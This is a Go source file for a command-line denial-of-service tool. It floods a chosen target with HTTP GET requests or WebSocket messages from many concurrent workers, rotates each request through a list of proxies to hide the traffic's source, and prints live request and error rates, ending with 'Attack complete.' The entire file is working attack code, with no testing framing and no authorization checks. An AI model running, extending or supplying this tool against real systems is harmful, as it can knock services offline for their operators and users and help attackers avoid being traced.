package main

import (
    "encoding/json"
    "flag"
    "fmt"
    "net"
    "net/http"
    "net/url"
    "os"
    "sync"
    "sync/atomic"
    "time"

    "github.com/gorilla/websocket"
)

// ANSI color codes
const (
    ColorReset  = "\033[0m"
    ColorRed    = "\033[31m"
    ColorGreen  = "\033[32m"
    ColorYellow = "\033[33m"
    ColorBlue   = "\033[34m"
)

var (
    targetURL   = flag.String("target", "", "Target URL (http:// or ws://)")
    module      = flag.String("module", "http", "Attack module: http or websocket")
    duration    = flag.Int("duration", 30, "Attack duration in seconds")
    concurrency = flag.Int("concurrency", 100, "Number of concurrent workers")
    rate        = flag.Int("rate", 0, "Rate per worker (requests/sec, 0 = max)")
    path        = flag.String("path", "/", "HTTP request path")
    proxyFile   = flag.String("proxies", "", "JSON file of proxy URLs")
    message     = flag.String("message", "FLOOD", "WebSocket message payload")
)

// Global stats
var (
    totalRequests uint64
    totalErrors   uint64
    proxies       []string
    proxyIndex    uint64
)

func loadProxies(file string) {
    data, err := os.ReadFile(file)
    if err != nil {
        fmt.Printf(ColorRed+"Failed to load proxies: %v"+ColorReset+"\n", err)
        return
    }
    if err := json.Unmarshal(data, &proxies); err != nil {
        fmt.Printf(ColorRed+"Invalid proxy JSON: %v"+ColorReset+"\n", err)
    }
    fmt.Printf(ColorGreen+"Loaded %d proxies"+ColorReset+"\n", len(proxies))
}

func getProxy() string {
    if len(proxies) == 0 {
        return ""
    }
    idx := atomic.AddUint64(&proxyIndex, 1)
    return proxies[idx%uint64(len(proxies))]
}

func resolveIP(rawURL string) string {
    u, err := url.Parse(rawURL)
    if err != nil {
        return rawURL
    }
    host := u.Hostname()
    ips, err := net.LookupIP(host)
    if err != nil || len(ips) == 0 {
        return host
    }
    return ips[0].String()
}

func httpWorker(wg *sync.WaitGroup, stop <-chan struct{}) {
    defer wg.Done()
    transport := &http.Transport{}
    client := &http.Client{Transport: transport, Timeout: 5 * time.Second}
    targetIP := resolveIP(*targetURL)
    reqURL := fmt.Sprintf("%s%s", *targetURL, *path)
    var interval time.Duration
    if *rate > 0 {
        interval = time.Second / time.Duration(*rate)
    }
    for {
        select {
        case <-stop:
            return
        default:
            if p := getProxy(); p != "" {
                proxyURL, _ := url.Parse(p)
                transport.Proxy = http.ProxyURL(proxyURL)
            }
            req, _ := http.NewRequest("GET", reqURL, nil)
            req.Host = targetIP
            _, err := client.Do(req)
            if err != nil {
                atomic.AddUint64(&totalErrors, 1)
            }
            atomic.AddUint64(&totalRequests, 1)
            if interval > 0 {
                time.Sleep(interval)
            }
        }
    }
}

func wsWorker(wg *sync.WaitGroup, stop <-chan struct{}) {
    defer wg.Done()
    dialer := websocket.DefaultDialer
    for {
        select {
        case <-stop:
            return
        default:
            if p := getProxy(); p != "" {
                proxyURL, _ := url.Parse(p)
                dialer.Proxy = http.ProxyURL(proxyURL)
            }
            conn, _, err := dialer.Dial(*targetURL, nil)
            if err != nil {
                atomic.AddUint64(&totalErrors, 1)
                continue
            }
            for {
                if _, err := conn.WriteMessage(websocket.TextMessage, []byte(*message)); err != nil {
                    atomic.AddUint64(&totalErrors, 1)
                    break
                }
                atomic.AddUint64(&totalRequests, 1)
                if *rate > 0 {
                    time.Sleep(time.Second / time.Duration(*rate))
                }
                select {
                case <-stop:
                    conn.Close()
                    return
                default:
                }
            }
            conn.Close()
        }
    }
}

func printStats(stop <-chan struct{}) {
    ticker := time.NewTicker(1 * time.Second)
    defer ticker.Stop()
    for {
        select {
        case <-stop:
            return
        case <-ticker.C:
            r := atomic.SwapUint64(&totalRequests, 0)
            e := atomic.SwapUint64(&totalErrors, 0)
            fmt.Printf(ColorBlue+"Req/sec: %6d  Err/sec: %6d"+ColorReset+"\r", r, e)
        }
    }
}

func main() {
    flag.Parse()
    if *targetURL == "" {
        flag.Usage()
        os.Exit(1)
    }
    if *proxyFile != "" {
        loadProxies(*proxyFile)
    }
    stop := make(chan struct{})
    go func() {
        time.Sleep(time.Duration(*duration) * time.Second)
        close(stop)
    }()
    var wg sync.WaitGroup
    wg.Add(*concurrency)
    for i := 0; i < *concurrency; i++ {
        if *module == "websocket" {
            go wsWorker(&wg, stop)
        } else {
            go httpWorker(&wg, stop)
        }
    }
    go printStats(stop)
    wg.Wait()
    fmt.Println("\n" + ColorYellow + "Attack complete." + ColorReset)
}